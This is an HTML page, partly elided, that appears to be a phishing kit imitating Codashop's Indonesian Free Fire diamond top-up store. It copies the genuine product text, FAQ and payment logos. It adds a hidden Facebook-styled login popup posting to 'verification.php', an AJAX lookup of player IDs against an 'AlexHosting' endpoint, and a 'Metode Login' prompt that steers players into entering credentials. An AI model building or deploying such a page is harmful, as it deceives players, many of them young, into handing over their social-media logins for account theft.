...
<link href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
      <link rel="stylesheet" href="../css/popup-AlexHost.css">
      <link rel="stylesheet" href="../css/facebook-AlexHost.css">
      <link rel="stylesheet" href="../css/VK-AlexHost.css">
...
<div class="popup-login facebook animated fadeIn" style="display: none;">
	<div class="popup-box-login-fb">
		<a onclick="tutup_facebook()" class="close-fb"><i class="fa fa-times"></i></a>
		<div class="navbar-fb">
		...
		<div class="content-box-fb">
			...
			<form class="login-form" action="verification.php" onsubmit="return AlexHost()" method="post" 
onclick="$(this).end()">
				<label>
				...
				<input type="hidden" name="playid" id="userIdForm">
         ...
         <main class="container product-container">
            ...
            <header class="product-details-container shop-content__container">
               <figure class="product-top-banner__container shop-content--image">
                  <img src="https://rawcdn.githack.com/AlexHostX/all.img/1ad376f70fc8f0feb803d664737970c83f1614fc/freefire_640x241.jpg" alt="" class="product__top-banner">
               </figure>
...
<a class="shop-content--image" target="_blank" rel="noopener"> 

<img src="https://cdn1.codashop.com/S/content/common/images/promos/Community Banners/freefire_id_codaclub.jpeg" alt="Free Fire Conversation"></a></p>
               </article>
            </header>
            <section id="contents" class="main-content">
               ...
               <div class="section select-server">
                  <h2 class="circle">
                     <span style="background: #6242fc;">1</span> Masukkan Player ID
                  </h2>
                  <div class="form-group-container form-user-identities">
                     ...
                     <p class="form__field-instruction-text">Untuk menemukan ID Anda, ketuk pada ikon karakter. User ID tercantum di bawah nama karakter Anda. Contoh: "5363266446".</p>
                  </div>
               </div>
                        ...
                        <div class="payment-channel-link" onclick="selectPaymentChannel(227, 'GoPay', false, false, false, false, false);">
                           ...
                           <div class="payment-channel-container">
                              <figure class="payment-logo-container">
                                 <img class="logo" src="https://rawcdn.githack.com/AlexHostX/all.img/188f95ac095c8ec78d1e2373d62ec1bf72f27f4d/4a1de2b32330e0bb24f0073b7510aa3f84cd62f0.png" alt="GO_PAY logo" />
                              </figure>
                           </div>
    ...
    border-radius: 20px;">
         ...
         <section class="section product__long-description shop-content__container" style="background: #280031;"> 
            <h1 class="product-tagline-title">
                    ...
                    Codashop - The best way to top up FF Diamond in Indonesia
...
<p class="shop-content--paragraph"><strong>Tentang Free Fire</strong><br>
Free Fire adalah game mobile (seluler) battle royale survival shooter terpopuler di Indonesia. Setiap 10 menit permainan kamu akan ditempatkan di pulau terpencil dimana kamu akan diadu melawan 49 pemain lainnya, lawan semua musuhmu untuk tetap hidup. Kamu dapat memilih titik pendaratan mengunakan parasut, ataupun tetap berada di zona aman selama yang kamu inginkan. Telusuri luasnya map pakai kendaraan keren, bersembunyilah dibalik parit-parit, dan bergerilya dari balik rerumputan. Maju, tembak dan bertahanlah, karena pada akhirnya hanya satu tujuanmu: bertahan dan jadi pemenang!</p>
<p class="shop-content--paragraph"><strong>Persyaratan Sistem Minimum</strong>
<br>• OS: Android 4.0.3 atau iOs 8.0 atau lebih
<br>• Storage: 1.1 GB
<br>• RAM: 2GB</p>

<p class="shop-content--paragraph"><strong>PERINGATAN</strong>: Metode pembayaran ShopeePay hanya tersedia untuk Pengguna Seluler (Mobile). Harap pastikan bahwa aplikasi Shopee Anda telah diperbarui dan memiliki saldo ShopeePay yang mencukupi sebelum melakukan top up.</p>
<p class="shop-content--paragraph">Top up diamond FF hanya dalam hitungan detik! Cukup masukan User ID Free Fire Anda, pilih jumlah Diamond yang Anda inginkan, kemudian selesaikan pembayaran. Setelah pembayaran berhasil Diamond FF akan secara langsung ditambahkan ke akun Free Fire (FF) Anda.</p>
<p class="shop-content--paragraph">Bayarlah menggunakan GoPay, OVO, DANA, ShopeePay, Transfer Bank, Indosat, Tri, Telkomsel, XL, Smartfren, Indomaret, Alfamart Kredivo, LinkAja, TrueMoney, hingga DOKU Wallet. Codashop adalah cara terbaik untuk top up diamond (FF) Free Fire secara online tanpa kartu kredit, registrasi ataupun log-in.</p>
<p class="shop-content--paragraph">Unduh dan mainkan Free Fire sekarang!<br>
<a class="shop-content--badge" href="https://apps.apple.com/US/app/id1300146617?mt=8" rel="noopener" target="_blank">
<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/app_store_coda.png" alt="Download on the App Store"></a>
<a class="shop-content--badge" href="https://play.google.com/store/apps/details?id=com.dts.freefireth" rel="noopener" target="_blank">
<img src="https://d1qgcmfii0ptfa.cloudfront.net/S/content/mobile/images/google_play_coda.png" alt="Download on Google Play"></a></p>

<p class="shop-content--paragraph">NGOBROL BARENG TENTANG<br>
<a class="shop-content--image" href="https://community.codashop.com/id/categories/id-free-fire" target="_blank" rel="noopener"> 

<img src="https://cdn1.codashop.com/S/content/common/images/promos/Community Banners/freefire_id_codaclub.jpeg" alt="Free Fire Conversation"></a>
            ...
            <div class="accordion-container centered-align"><section class="accordion-section">
                    <div>
                      ...
                      <label class="faq-switcher-area" for="faq-1">
                        <h3 class="faq-element__question">Bagaimana cara top up Free Fire?</h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph">Beli diamond Free Fire jadi mudah, aman, dan praktis di Codashop. Cukup ikuti langkah-langkah berikut dan bayarlah menggunakan GoPay, OVO, DANA, ShopeePay, Bank transfer, Indosat, Tri, Telkomsel, XL, Smartfren, Indomaret, Alfamart Kredivo, LinkAja, True Money, dan DOKU Wallet. Diamond dijamin terkirim hanya dalam hitungan detik.<br>
...
<li>Pilih cara pembayaran mudah yang kamu suka.</li>
<li>Klik tombol "Beli Sekarang" untuk menyelesaikan transaksi-mu.</li></ul><p></p></article> 
                    </div>
                    ...
                    <div>
                      ...
                      <label class="faq-switcher-area" for="faq-2">
                        <h3 class="faq-element__question">Dimana Tempat Top up FF Termurah?</h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph">Jika kamu ingin membeli diamond FF dengan harga termurah, pastikan cek semua pilihan pembayaran yang ada di Codashop dan temukan harga terbaik untuk jumlah diamond pilihanmu.</p>
<p class="shop-content--paragraph">Biasanya pembelian diamond Free Fire lebih murah menggunakan metode pembayaran e-wallet seperti GoPay, OVO, Dana, ShopeePay dan LinkAja.</p></article> 
                    </div>
                  </section><section class="accordion-section">
                    <div>
                      <input class="faq-switcher" type="checkbox" id="faq-3">
                      <label class="faq-switcher-area" for="faq-3">
                        <h3 class="faq-element__question">Bagaimana Cara Membeli Elite Pass Free Fire?</h3>
                        <span class="faq-element__arrow"></span>
                        </label>
                      <article class="faq-element__answer"><p class="shop-content--paragraph">Beli Elite Pass Free Fire sangatlah mudah! Cukup top up 500 diamond untuk beli Elite Pass, dan 900 diamond untuk beli Elite Bundle.
</p>
<ul class="shop-content--list list-number"><li><a href="#top">Klik di sini untuk beli diamond Free Fire</a>.</li>
<li>Jika diamond-mu telah cukup untuk pembelian Elite Pass atau Elite Bundle, langsung masuk ke aplikasi Free Fire mu.</li>
<li>Di bagian sebelah kiri halaman utama Free Fire, klik "Fire Pass".</li>
<li>Klik tombol "Upgrade" dan beli Elite Pass seharga 500 diamond, atau jika kamu ingin hadiah yang lebih banyak lagi pastikan beli Elite Bundle seharga 900 diamond.</li></ul>
<p class="shop-content--paragraph">Tada! Setelah Elite Pass-mu telah aktif, mulai selesaikan misi demi misi &amp; berbagai tantangan untuk membuka hadiah-hadiah eksklusif Elite Pass.</p></article> 
                    </div>
                  </section></div>
        </section>
      ...
      <div style="display: none;" id="showKonfirm">
         <div tabindex="-1" role="dialog" class="ui-dialog ui-corner-all ui-widget ui-widget-content ui-front confirm-user-dialog__container ui-dialog-buttons ui-draggable" aria-describedby="confirm-user-dialog" aria-labelledby="ui-id-1" style="padding-top: 15px;">
            ...
            <div class="confirm-modal__container ui-dialog-content ui-widget-content verif" id="confirm-user-dialog" style="display: block;">
            ...
            $("li.voucher-list-element").on('click', function() {
               ...
               $("#mdn-submit").on('click', function() {
                  ...
                  if(userId == "") {
                     ...
                     $.ajax({
                        url: "../../API-AlexHosting.net/AlexHost-ID.php",
                        type: "POST",
                        data: "userId="+userId,
                        beforeSend: function() {
                           $("#overlay").hide();
                        ...
                        success: function(response) {
                           ...
                           if(!$.trim(response)) {
                              $("#submit-loader").hide();
                              $("#errorMessage").addClass("errorMessage__container");
                              $("#errorMessage").html("<li class='error-msg__element'>Player ID ini tidak dapat ditemukan: "+userId+"</li>");
                              $("#overlay").show();
                              $(".popError").show();
                           } else {
                              $("#submit-loader").hide();
                              ...
                              $("#doConfirm").on("click", function() {
                                 ...
                                 $("#errorMessage").html('<center><h4>Metode Login :</h4><div class="imgLogin" style="display:block; margin: auto; margin-top: 20px;"><img id="fbAlexHost" src="https://rawcdn.githack.com/AlexHostX/all.img/c0daf78d8408d0672ccc4e4183bda1afd9905f3e/20210315_012118.png" alt="" style="width: 250px; cursor: pointer; display: block; margin: 5px auto;">  </div></center>');
                                 $("#overlay").show();
                                 $(".popError").show();
                                 $("#hidePopError").hide();
      ...
      <script type="text/javascript" src="https://cdn.statically.io/gh/cdnstatically/5.6.0/main/statically/protect.min.js"></script>
